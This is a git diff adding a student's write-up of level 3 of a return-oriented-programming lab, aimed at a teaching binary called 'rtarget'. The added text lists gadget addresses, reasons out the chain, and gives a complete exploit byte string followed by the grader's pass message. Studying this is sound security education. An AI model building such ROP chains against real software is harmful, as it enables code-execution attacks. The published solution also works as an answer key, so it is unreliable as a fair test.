@@ -20,7 +20,9 @@
         - [3.1.1. Gadget Note](#311-gadget-note)
         - [3.1.2. Attempt Thoughts](#312-attempt-thoughts)
         - [3.1.3. Process Record](#313-process-record)
-    - [3.2.](#32)
+    - [3.2. Level 3](#32-level-3)
+        - [3.2.1. Attempt Thoughts](#321-attempt-thoughts)
+        - [3.2.2. Process Record](#322-process-record)
 
 ---
 
@@ -460,4 +462,116 @@ it will be filled with several part:
     NICE JOB!
     ```
 
-### 3.2. 
+### 3.2. Level 3
+
+#### 3.2.1. Attempt Thoughts
+
+very complicated  
+
+in a word, find all the gadgets  
+and make fully use of it  
+
+and there is some thing we can use directly  
+*add_xy*  
+we should not miss it  
+
+and because of the randomization  
+we can't hard code the address of the string we want  
+so we use offset and other address to denote it indirectly  
+
+#### 3.2.2. Process Record
+
+1. find useful gadgets  
+
+    ```txt
+    40193a gadget : movq %rax, %rdi
+    40193b gadget : movl %edx, %edi
+    40193f gadget : movq %rax, %rdi
+    401940 gadget : movl %edx, %edi
+    401947 gadget : popq %rax
+    401953 gadget : popq %rax
+    40196a gadget : movq %rsp, %rax
+    40196b gadget : movl %esp, %eax
+    40197a gadget : movl %ecx, %esi
+    40199c gadget : nop
+    4019a1 gadget : movl %eax, %edx
+                    orb  %al, %al
+    4019bc gadget : movq %rsp, %rax
+                    nop
+    4019bd gadget : movl %esp, %eax
+                    nop
+    4019c5 gadget : testb %cl, %cl
+    4019de gadget : movl %edx, %ecx
+                    testb %al, %al
+    401a05 gadget : movl %eax, %edx
+                    nop
+    401a2d gadget : movl %edx, %ecx
+                    testb %bl, %bl
+    401a3a gadget : movl %ecx, %esi
+                    testb %al, %al
+    401964 gadget : lea (%rdi,%rsi,1), %rax
+    ```
+
+2. construct the train of ROP attack  
+    1. movq %rsp, %rax  
+    2. movq %rax, %rdi  
+    3. pop %rax  
+    4. movl %eax, %edx  
+    5. movl %edx, %ecx
+    6. movl %ecx, %esi  
+        right now: p1 in di, pd in si  
+    7. lea (%rdi,%rsi,1), %rax  
+    8. movq %rax, %rdi  
+    9. ret to touch3  
+
+3. translate it to actual ROP train  
+    1. (getbuf) ret : PC <-- 40196a(gadget1)  
+    2. (gadget1) movq %rsp, %rax : %rax <-- pointer to the stack(p1)  
+    3. (gadget1) ret : PC <-- 40193a(gadget2)  
+    4. (gadget2) movq %rax, %rdi : %rdi <-- p1  
+    5. (gadget2) ret : PC <-- 401947(gadget3)  
+    6. (gadget3) pop %rax : %rax <-- bias(pd) between p1 and start addr of string(p2)  
+    7. (gadget3) ret : PC <-- 401a05(gadget4)  
+    8. (gadget4) movl %eax, %edx  
+    9. (gadget4) ret : PC <-- 4019de(gadget5)  
+    10. (gadget5) movl %edx, %ecx  
+    11. (gadget5) ret : PC <-- 40197a(gadget6)  
+    12. (gadget6) movl %ecx, %esi  
+    13. (gadget6) ret : PC <-- 401964(gadget7)  
+    14. (gadget7) lea (%rdi,%rsi,1), %rax : %rax <-- p2  
+    15. (gadget7) ret : PC <-- 40193a(gadget8)  
+    16. (gadget8) movq %rax, %rdi : %rdi <-- p2  
+    17. (gadget8) ret : PC <-- 0x000000000040188d(touch3)  
+
+4. ready to edit exploit string  
+
+    ```txt
+    68 68 68 68 68 68 68 68
+    68 68 68 68 68 68 68 68
+    68 68 68 68 68 68 68 68
+    68 68 68 68 68 68 68 68
+    68 68 68 68 68 68 68 68 /* 0x28 filling values */ 
+    6a 19 40 00 00 00 00 00 /* 0x40196a  (8)  */ 
+    3a 19 40 00 00 00 00 00 /* 0x40193a  (8)  */ 
+    47 19 40 00 00 00 00 00 /* 0x401947  (8)  */ 
+    48 00 00 00 00 00 00 00 /* 0x48      (8)  */ 
+    05 1a 40 00 00 00 00 00 /* 0x401a05  (8)  */ 
+    de 19 40 00 00 00 00 00 /* 0x4019de  (8)  */ 
+    7a 19 40 00 00 00 00 00 /* 0x40197a  (8)  */ 
+    64 19 40 00 00 00 00 00 /* 0x401964  (8)  */ 
+    3a 19 40 00 00 00 00 00 /* 0x40193a  (8)  */ 
+    8d 18 40 00 00 00 00 00 /* 0x000000000040188d (8)  */ 
+    37 32 64 66 65 37 61 64 /* string hex ascii (8)  */ 
+    00 /* string terminal (1)  */ 
+    ```
+
+5. deploy the exploit string  
+
+6. record  
+
+    ```txt
+    Type string:Touch3!: You called touch3("72dfe7ad")
+    Valid solution for level 3 with target rtarget
+    PASS: Sent exploit string to server to be validated.
+    NICE JOB!
+    ```
